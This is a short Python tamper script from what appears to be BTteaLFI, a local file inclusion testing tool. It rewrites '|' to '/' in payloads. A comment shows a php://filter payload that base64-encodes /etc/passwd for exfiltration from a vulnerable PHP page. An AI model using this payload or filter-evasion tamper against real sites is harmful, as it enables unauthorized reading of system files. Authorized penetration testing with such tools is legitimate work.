# BTteaLFI
# Copyright (C) 2024-2025 BTtea
#
# This file is licensed under GPLv2. See LICENSE.txt for details.

# page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd  =>  page=php://filter/convert.base64-encode/convert.base64-encode/resource=/etc/passwd

def tamper(payload:str):
    if payload:
        payload=payload.replace('|','/')
    return payload